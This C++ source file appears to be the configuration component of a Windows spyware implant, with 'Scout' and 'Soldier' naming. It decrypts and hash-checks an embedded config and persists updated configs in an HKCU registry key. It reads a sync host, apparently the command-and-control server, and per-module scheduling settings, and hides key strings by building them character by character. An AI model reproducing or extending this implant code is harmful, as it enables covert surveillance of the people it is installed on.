#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <string>

#include "globals.h"
#include "binpatch.h"
#include "crypt.h"
#include "JSON.h"
#include "zmem.h"
#include "conf.h"
#include "debug.h"
#include "utils.h"

LPWSTR strConf = NULL;

BOOL SaveConf(LPBYTE lpBuffer, DWORD dwSize)
{
	HKEY hKey;
	WCHAR strBase[] = SOLDIER_REGISTRY_KEY;
	WCHAR strKeyName[] = SOLDIER_REGISTRY_CONF;

	LPWSTR strUnique = GetScoutSharedMemoryName();
	LPWSTR strSubKey = (LPWSTR) zalloc(1024*sizeof(WCHAR));
	_snwprintf_s(strSubKey, 1024, _TRUNCATE, L"%s\\%s", strBase, strUnique);

	if (!CreateRegistryKey(HKEY_CURRENT_USER, strSubKey, REG_OPTION_NON_VOLATILE, KEY_READ|KEY_WRITE, &hKey))
	{
		zfree(strUnique);
		zfree(strSubKey);
		return FALSE;
	}

	DWORD dwRet = RegSetValueEx(hKey, strKeyName, 0, REG_BINARY, lpBuffer, dwSize);

	RegCloseKey(hKey);
	zfree(strUnique);
	zfree(strSubKey);
	return TRUE;
}

BOOL NewConf(LPBYTE lpBuffer, BOOL bPause, BOOL bSave)
{
	HANDLE hTool;
	THREADENTRY32 pThread;
	DWORD dwCypherLen = *((LPDWORD)lpBuffer);
	LPBYTE lpTmpBuffer = (LPBYTE) zalloc(dwCypherLen+6);
	memcpy(lpTmpBuffer, lpBuffer, dwCypherLen+6);

	BYTE lpSha1Sum[SHA_DIGEST_LENGTH];
	Decrypt(lpBuffer+4, dwCypherLen, pConfKey);
	DWORD dwConfLen = strlen((LPSTR)(lpBuffer+4));

	// verify conf hash
	CalculateSHA1(lpSha1Sum, lpBuffer+4, dwConfLen);
	if (memcmp(lpSha1Sum, (lpBuffer+4+dwConfLen+1), SHA_DIGEST_LENGTH))
	{
		zfree(lpTmpBuffer);
		return FALSE;
	}

	if (bPause)
	{
		hTool = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD , NULL);
		pThread.dwSize = sizeof(THREADENTRY32);

		if (Thread32First(hTool, &pThread))
		{
			do
			{
				if (pThread.th32OwnerProcessID == GetCurrentProcessId())
				{
					if (pThread.th32ThreadID != GetCurrentThreadId())
					{
						HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME , FALSE, pThread.th32ThreadID);
						if (hThread)
						{
							SuspendThread(hThread);
							CloseHandle(hThread);
						}
					}
				}	
				pThread.dwSize = sizeof(THREADENTRY32);
			}
			while (Thread32Next(hTool, &pThread));
		}
		CloseHandle(hTool);
	}

	zfree(strConf);

	strConf = (LPWSTR) zalloc((dwConfLen+2)*sizeof(WCHAR));
	_snwprintf_s(strConf, dwConfLen+1, _TRUNCATE, L"%S", lpBuffer+4);

	if (bPause)
	{
		hTool = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD , NULL);
		pThread.dwSize = sizeof(THREADENTRY32);
		if (Thread32First(hTool, &pThread))
		{
			do
			{
				if (pThread.th32OwnerProcessID == GetCurrentProcessId())
				{
					if (pThread.th32ThreadID != GetCurrentThreadId())
					{
						HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME , FALSE, pThread.th32ThreadID);
						if (hThread)
						{

							ResumeThread(hThread);
							CloseHandle(hThread);
						}
					}
				}	
				pThread.dwSize = sizeof(THREADENTRY32);
			}
			while (Thread32Next(hTool, &pThread));
		}
		CloseHandle(hTool);
	}

	if (bSave)
		SaveConf(lpTmpBuffer, dwCypherLen+6);

	zfree(lpTmpBuffer);
	return TRUE;
}

BOOL LoadConf()
{
	HKEY hKey;
	WCHAR strBase[] = SOLDIER_REGISTRY_KEY;
	WCHAR strKeyName[] = SOLDIER_REGISTRY_CONF;

	LPWSTR strUnique = GetScoutSharedMemoryName();
	LPWSTR strSubKey = (LPWSTR) zalloc(1024*sizeof(WCHAR));
	_snwprintf_s(strSubKey, 1024, _TRUNCATE, L"%s\\%s", strBase, strUnique);

	if (RegOpenKeyEx(HKEY_CURRENT_USER, strSubKey, 0, KEY_READ|KEY_WRITE, &hKey) != ERROR_SUCCESS)
	{
		zfree(strUnique);
		zfree(strSubKey);
		return DecryptConf();
	}

	DWORD dwOut, dwSize;
	dwOut = dwSize = 10;

	LPBYTE lpBuffer = (LPBYTE) malloc(10);
	DWORD dwRet = RegQueryValueEx(hKey, strKeyName, NULL, NULL, lpBuffer, &dwOut);

	while (dwRet == ERROR_MORE_DATA)
	{
		dwSize += 1024;
		lpBuffer = (LPBYTE) realloc(lpBuffer, dwSize);
		dwOut = dwSize;

		dwRet = RegQueryValueEx(hKey, strKeyName, NULL, NULL, lpBuffer, &dwOut);
	}
	CloseHandle(hKey);

	if (dwRet == ERROR_SUCCESS)
		dwRet = NewConf(lpBuffer, FALSE, FALSE);
	else
		dwRet = DecryptConf();

	zfree(lpBuffer);
	zfree(strUnique);
	zfree(strSubKey);
	return dwRet;
}

BOOL DecryptConf()
{
	DWORD dwCypherLen = *((LPDWORD)EMBEDDED_CONF);
	if (dwCypherLen == 0xDEADBEEF)
		return TRUE;

#ifndef _DEBUG
	// decrypt conf
	BYTE lpSha1Sum[SHA_DIGEST_LENGTH];
	Decrypt(EMBEDDED_CONF+4, dwCypherLen, pConfKey);
#endif

	DWORD dwConfLen = strlen((LPSTR)(EMBEDDED_CONF+4));
#ifndef _DEBUG
	// verify conf hash
	CalculateSHA1(lpSha1Sum, EMBEDDED_CONF+4, dwConfLen);
	if (memcmp(lpSha1Sum, (EMBEDDED_CONF+4+dwConfLen+1), SHA_DIGEST_LENGTH))
		return FALSE;
#endif
	
	EMBEDDED_CONF[4+dwConfLen+1] = 0; // FIXME: zero-termina StrConf non questa, pirla!, eh si certo e lo sprintf qui sotto.. lo facciamo sbombare?!

	strConf = (LPWSTR) zalloc((dwConfLen+2)*sizeof(WCHAR));
	_snwprintf_s(strConf, dwConfLen+1, _TRUNCATE, L"%S", EMBEDDED_CONF+4);

	// check if we have at least an ip address for the sync
	CHAR strIp[100];
	if (GetSyncIp(strIp))
		return TRUE;

	return FALSE;
}


BOOL GetSyncIp(LPSTR strIp)
{
	BOOL bRet = FALSE;
	WCHAR strSync[] = { L's', L'y', L'n', L'c', L'\0' };
	WCHAR strHost[] = { L'h', L'o', L's', L't', L'\0' };

	JSONValue *jValue = JSON::Parse(strConf);
	if (jValue != NULL && jValue->IsObject())
	{
		JSONObject jRoot = jValue->AsObject();
		if (jRoot.find(strSync) != jRoot.end() && jRoot[strSync]->IsObject())
		{
			JSONObject jSync = jRoot[strSync]->AsObject();
			if (jSync.find(strHost) != jSync.end() && jSync[strHost]->IsString())
			{
				_snprintf_s(strIp, 100, _TRUNCATE, "%S", jSync[strHost]->AsString().c_str());
				bRet = TRUE;
			}
		}
	}
	
	if (jValue)
		delete jValue;

#ifdef _DEBUG
	if (bRet == FALSE)
	{
		OutputDebug(L"[!!] GetSyncIp Fail!!");
		__asm int 3;
	}
#endif
	return bRet;
}

BOOL ConfIsModuleEnabled(LPWSTR strModule)
{
	BOOL bRet = FALSE;
	WCHAR strEnabled[] = { L'e', L'n', L'a', L'b', L'l', L'e', L'd', L'\0' };

	JSONValue *jValue = JSON::Parse(strConf);
	if (jValue != NULL && jValue->IsObject())
	{
		JSONObject jRoot = jValue->AsObject();
		if (jRoot.find(strModule) != jRoot.end() && jRoot[strModule]->IsObject())
		{
			JSONObject jMod = jRoot[strModule]->AsObject();
			if (jMod.find(strEnabled) != jMod.end() && jMod[strEnabled]->IsBool())
			{
				if (jMod[strEnabled]->AsBool())
					bRet = TRUE;
			}
		}
	}
	
	if (jValue)
		delete jValue;

	return bRet;	
}

DWORD ConfGetRepeat(LPWSTR strModule)
{
	DWORD dwSleep = 20; // 60 secs
	WCHAR strRepeat[] = { L'r', L'e', L'p', L'e', L'a', L't', L'\0' };

	JSONValue *jValue = JSON::Parse(strConf);
	if (jValue != NULL && jValue->IsObject())
	{
		JSONObject jRoot = jValue->AsObject();
		if (jRoot.find(strModule) != jRoot.end() && jRoot[strModule]->IsObject())
		{
			JSONObject jMod = jRoot[strModule]->AsObject();
			if (jMod.find(strRepeat) != jMod.end() && jMod[strRepeat]->IsNumber())
				dwSleep = jMod[strRepeat]->AsNumber();
		}
	}

	if (jValue)
		delete jValue;

	if (dwSleep < 20 && strModule[1] != 'y') // FIXME
		return 20;
	else
		return dwSleep;
}

DWORD ConfGetIter(LPWSTR strModule)
{
	DWORD dwIter = 0;
	WCHAR strIter[] = { L'i', L't', L'e', L'r', L'\0' };

	JSONValue *jValue = JSON::Parse(strConf);
	if (jValue != NULL && jValue->IsObject())
	{
		JSONObject jRoot = jValue->AsObject();
		if (jRoot.find(strModule) != jRoot.end() && jRoot[strModule]->IsObject())
		{
			JSONObject jMod = jRoot[strModule]->AsObject();
			if (jMod.find(strIter) != jMod.end() && jMod[strIter]->IsNumber())
				dwIter = jMod[strIter]->AsNumber();
		}
	}

	if (jValue)
		delete jValue;

	if (dwIter == 0)
		return 1;
	else
		return dwIter;
}